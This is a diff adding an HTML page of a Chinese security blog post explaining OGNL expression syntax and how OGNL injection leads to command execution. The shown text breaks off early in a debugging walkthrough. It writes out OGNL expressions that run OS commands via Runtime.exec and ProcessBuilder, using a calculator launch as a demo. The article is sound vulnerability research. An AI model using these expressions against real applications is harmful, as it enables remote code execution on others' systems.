@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="本文首发于先知：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10482。 0x00 前言前段时间出现的Confluence OGNL漏洞（CVE-2021-26084）引起了我对Java OGNL表达式注入的兴趣，当时没有时间立刻研究，近期又捡起来学习和分析，用了近半月整理了本文，如有不当之处，还请批评指正。 0x01 OGNL是什么？先来看一个例子: 12345678910111213141">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一文读懂OGNL漏洞">
+<meta property="og:url" content="https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="本文首发于先知：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10482。 0x00 前言前段时间出现的Confluence OGNL漏洞（CVE-2021-26084）引起了我对Java OGNL表达式注入的兴趣，当时没有时间立刻研究，近期又捡起来学习和分析，用了近半月整理了本文，如有不当之处，还请批评指正。 0x01 OGNL是什么？先来看一个例子: 12345678910111213141">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211025144423721.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211025144845858.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211025150113966.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211025153351367.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211025193041466.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211020192633280.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211102092238828.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211029164937856.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211029172804509.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101105528345.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101105925308.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101131402876.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101110706205.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211102093809308.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101170016049.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101170622663.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101153540964.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101143729230.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211101145629151.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211102110327135.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211102111044355.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211103110834187.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211102221814529.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211103104954008.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211103120901467.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211103123206409.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104194555280.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104155511463.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104155409360.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104162405728.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104162829209.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104163255369.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104164329827.png">
+<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20211104194834108.png">
+<meta property="article:published_time" content="2021-11-20T11:10:38.000Z">
+<meta property="article:modified_time" content="2021-11-20T11:10:38.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="OGNL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://r17a-17.github.io/imgs/image-20211025144423721.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>一文读懂OGNL漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&text=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&is_video=false&description=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一文读懂OGNL漏洞&body=Check out this article: https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&name=一文读懂OGNL漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&t=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-OGNL是什么？"><span class="toc-number">2.</span> <span class="toc-text">0x01 OGNL是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-OGNL三元素"><span class="toc-number">3.</span> <span class="toc-text">0x02 OGNL三元素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-OGNL表达式语法"><span class="toc-number">4.</span> <span class="toc-text">0x03 OGNL表达式语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#符号的使用："><span class="toc-number">4.1.</span> <span class="toc-text">符号的使用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#集合表达式："><span class="toc-number">4.2.</span> <span class="toc-text">集合表达式：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-命令执行调试分析"><span class="toc-number">5.</span> <span class="toc-text">0x04 命令执行调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl低版本：2-7-3测试"><span class="toc-number">5.1.</span> <span class="toc-text">Ognl低版本：2.7.3测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl-3-2-18-测试"><span class="toc-number">5.2.</span> <span class="toc-text">Ognl 3.2.18 测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-近期三个漏洞的分析"><span class="toc-number">6.</span> <span class="toc-text">0x05 近期三个漏洞的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Confluence-CVE-2021-26084"><span class="toc-number">6.1.</span> <span class="toc-text">Confluence CVE-2021-26084</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#velocity模板引擎语法："><span class="toc-number">6.1.1.</span> <span class="toc-text">velocity模板引擎语法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析："><span class="toc-number">6.1.2.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-CVE-2020-17530（S2-061）"><span class="toc-number">6.2.</span> <span class="toc-text">Struts2 CVE-2020-17530（S2-061）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts2防护机制"><span class="toc-number">6.2.1.</span> <span class="toc-text">Struts2防护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析：-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Unomi-CVE-2020-13942"><span class="toc-number">6.3.</span> <span class="toc-text">Apache Unomi CVE-2020-13942</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析：-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-思考与总结"><span class="toc-number">7.</span> <span class="toc-text">0x06 思考与总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考链接："><span class="toc-number">8.</span> <span class="toc-text">0x07 参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一文读懂OGNL漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-20T11:10:38.000Z" itemprop="datePublished">2021-11-20</time>
+        
+        (Updated: <time datetime="2021-11-20T11:10:38.000Z" itemprop="dateModified">2021-11-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">表达式注入</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/OGNL%E6%B3%A8%E5%85%A5/">OGNL注入</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/OGNL%E6%B3%A8%E5%85%A5/" rel="tag">OGNL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>本文首发于先知：<a href="https://xz.aliyun.com/t/10482。" target="_blank" rel="noopener">https://xz.aliyun.com/t/10482。</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间出现的Confluence OGNL漏洞（CVE-2021-26084）引起了我对Java OGNL表达式注入的兴趣，当时没有时间立刻研究，近期又捡起来学习和分析，用了近半月整理了本文，如有不当之处，还请批评指正。</p>
+<h2 id="0x01-OGNL是什么？"><a href="#0x01-OGNL是什么？" class="headerlink" title="0x01 OGNL是什么？"></a>0x01 OGNL是什么？</h2><p>先来看一个例子:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class SchoolMaster&#123;</span><br><span class="line">    String name = <span class="string">"wanghua"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class School</span><br><span class="line">&#123;</span><br><span class="line">    String name = <span class="string">"tsinghua"</span>;</span><br><span class="line">    SchoolMaster schoolMaster;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Student</span><br><span class="line">&#123;</span><br><span class="line">    String name = <span class="string">"xiaoming"</span>;</span><br><span class="line">    School school;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建实例学校<code>school = new School()</code>、学生<code>student = new Student()</code>和校长<code>schoolMaster = new SchoolMaster()</code>，将学校校长指定为<code>schoolMaster</code>实例-<code>school.schoolMaster = schoolMaster</code>，学生的学校指定为<code>school</code>实例-<code>student.school = school</code>，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。</p>
+<p>那么OGNL就是实现对象图导航语言，全称Object-Graph Navigation Language。通过它我们可以存取 Java对象的任意属性、调用 Java 对象的方法以及实现类型转换等。</p>
+<h2 id="0x02-OGNL三元素"><a href="#0x02-OGNL三元素" class="headerlink" title="0x02 OGNL三元素"></a>0x02 OGNL三元素</h2><p>OGNL基本使用方法示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Student对象</span></span><br><span class="line">School school = <span class="keyword">new</span> School();</span><br><span class="line">school.setName(<span class="string">"tsinghua"</span>);</span><br><span class="line">school.setSchoolMaster(<span class="keyword">new</span> SchoolMaster(<span class="string">"wanghua"</span>));</span><br><span class="line">Student student1 = <span class="keyword">new</span> Student();</span><br><span class="line">student1.setName(<span class="string">"xiaoming"</span>);</span><br><span class="line">student1.setSchool(school);</span><br><span class="line">Student student2 = <span class="keyword">new</span> Student();</span><br><span class="line">student2.setName(<span class="string">"zhangsan"</span>);</span><br><span class="line">student2.setSchool(school);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建上下文环境</span></span><br><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line"><span class="comment">// 设置跟对象root</span></span><br><span class="line">context.setRoot(student1);</span><br><span class="line">context.put(<span class="string">"student2"</span>, student2);</span><br><span class="line"><span class="comment">// 获取ognl的root相关值</span></span><br><span class="line">Object name1 = Ognl.getValue(<span class="string">"name"</span>, context, context.getRoot());</span><br><span class="line">Object school1 = Ognl.getValue(<span class="string">"school.name"</span>, context, context.getRoot());</span><br><span class="line">Object schoolMaster1 = Ognl.getValue(<span class="string">"school.schoolMaster.name"</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name1 + <span class="string">":学校-"</span> + school1 + <span class="string">",校长-"</span>+schoolMaster1);</span><br><span class="line"><span class="comment">// 获取ognl非root相关值</span></span><br><span class="line">Object name2 = Ognl.getValue(<span class="string">"#student2.name"</span>, context, context.getRoot());</span><br><span class="line">Object school2 = Ognl.getValue(<span class="string">"#student2.school.name"</span>, context, context.getRoot());</span><br><span class="line">Object schoolMaster2 = Ognl.getValue(<span class="string">"#student2.school.schoolMaster.name"</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name2 + <span class="string">":学校-"</span> + school2 + <span class="string">",校长-"</span>+schoolMaster2);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaoming:学校-tsinghua,校长-wanghua</span><br><span class="line">zhangsan:学校-tsinghua,校长-wanghua</span><br></pre></td></tr></table></figure>
+
+<p>不难看出，OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：</p>
+<blockquote>
+<p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL<strong>需要执行什么操作</strong>；<br>root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定<strong>对谁进行操作</strong>；<br>context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作<strong>在哪里</strong>。</p>
+</blockquote>
+<p>在上面示例中，根对象是student1实例，context中设置了根对象和非根对象student2，表达式有<code>name</code>、<code>school.name</code>、<code>school.schoolMaster.name</code>和<code>student2.name</code>、<code>#student2.school.name</code>、<code>student2.school.schoolMaster.name</code>，前三个是通过表达式获取root也就是student1对象的相关属性，后三个是通过表达式获取容器变量student2对象的相关属性。</p>
+<h2 id="0x03-OGNL表达式语法"><a href="#0x03-OGNL表达式语法" class="headerlink" title="0x03 OGNL表达式语法"></a>0x03 OGNL表达式语法</h2><h3 id="符号的使用："><a href="#符号的使用：" class="headerlink" title="符号的使用："></a>符号的使用：</h3><p>在上一部分我们已经接触了<code>.</code>和<code>#</code>符号在表达式中的使用，通过<code>.</code>可以获取对象属性，<code>#</code>可以获取非root的Student对象。</p>
+<p>OGNL表达式支持Java基本运算，所以运算符<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code>等在OGNL都是支持的，另外还支持<code>in</code>、<code>eq</code>、<code>gt</code>等。</p>
+<p>除了基本运算符，<code>.</code>、<code>@</code>、<code>#</code>在OGNL中都有特殊含义。</p>
+<p>1、通过<code>.</code>获取对象的属性或方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>2、三种类型对象的获取：</p>
+<p>静态对象、静态方法和静态变量：<code>@</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line">@java.lang.Math@abs(-111)</span><br></pre></td></tr></table></figure>
+
+<p>非原生类型对象：<code>#</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>简单对象：直接获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;string&quot;.lenth</span><br><span class="line">5</span><br><span class="line">true</span><br></pre></td></tr></table></figure>
+
+<p>3、<code>%</code>符号的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p>
+<p>4、<code>$</code>在配置文件中引用OGNL表达式。</p>
+<h3 id="集合表达式："><a href="#集合表达式：" class="headerlink" title="集合表达式："></a>集合表达式：</h3><p><code>new</code>创建实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.lang.String(&quot;testnew&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><code>{}</code>和<code>[]</code>的用法：</p>
+<p>在OGNL中，可以用<code>{}</code>或者它的组合来创建列表、数组和map，<code>[]</code>可以获取下标元素。</p>
+<p>创建list：<code>{value1,value2...}</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1,3,5&#125;[1]</span><br></pre></td></tr></table></figure>
+
+<p>创建数组：<code>new type[]{value1,value2...}</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new int[]&#123;1,3,5&#125;[0]</span><br></pre></td></tr></table></figure>
+
+<p>创建map：<code>#{key:value,key1:value1...}</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;school&quot;:&quot;tsinghua&quot;&#125;[&quot;school&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>除了一些符号和集合，还支持Projection投影和Selection选择等，具体可参考官方文档：<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-ognl/language-guide.html</a> 附录Operators部分。</p>
+<h2 id="0x04-命令执行调试分析"><a href="#0x04-命令执行调试分析" class="headerlink" title="0x04 命令执行调试分析"></a>0x04 命令执行调试分析</h2><p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ognl低版本：2-7-3测试"><a href="#Ognl低版本：2-7-3测试" class="headerlink" title="Ognl低版本：2.7.3测试"></a>Ognl低版本：2.7.3测试</h3><p>调试分析<code>Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(\&quot;calc\&quot;)&quot;, context, context.getRoot());</code>执行流程。下图是表达式对应的语法树（AST），下面的分析可以结合图片思考。</p>
+<p><img src="/imgs/image-20211025144423721.png" alt="image-20211025144423721"></p>
+<p>Ognl.getValue()处理表达式时，会先生成一个tree，这个tree本质是SimpleNode实例，树的每个节点都是一个ASTChain实例，ASTChain继承自SimpleNode。</p>
+<p><img src="/imgs/image-20211025144845858.png" alt="image-20211025144845858"></p>
+<p>当调用<code>node.getValue(ognlContext, root);</code>时，会调用<code>SimpleNode.getValue()</code>进行处理，<code>SimpleNode.getValue()</code>会通过<code>SimpleNode.evaluateGetValueBody()</code>计算结果</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">getValue</span><span class="params">(OgnlContext context, Object source)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    Object result = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (context.getTraceEvaluations()) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = <span class="keyword">this</span>.evaluateGetValueBody(context, source);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>SimpleNode.evaluateGetValueBody()</code>在计算非常量情况的结果时会调用子类的getValueBody，Ognl在处理节点时分为多种情况进行处理：<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTChain.html" target="_blank" rel="noopener">ASTChain</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTConst.html" target="_blank" rel="noopener">ASTConst</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTCtor.html" target="_blank" rel="noopener">ASTCtor</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTInstanceof.html" target="_blank" rel="noopener">ASTInstanceof</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTList.html" target="_blank" rel="noopener">ASTList</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTMethod.html" target="_blank" rel="noopener">ASTMethod</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticField.html" target="_blank" rel="noopener">ASTStaticField</a>、<a href="https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticMethod.html" target="_blank" rel="noopener">ASTStaticMethod</a>等。</p>
+<p><img src="/imgs/image-20211025150113966.png" alt="image-20211025150113966"></p>
+<p>首先这里最开始是一个ASTChain <code>@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</code>，<code>ASTChain.getValueBody()</code>在处理时，会迭代调用getValue处理子节点的结果，最终还是会调用ASTXXX方法处理节点的结果。</p>
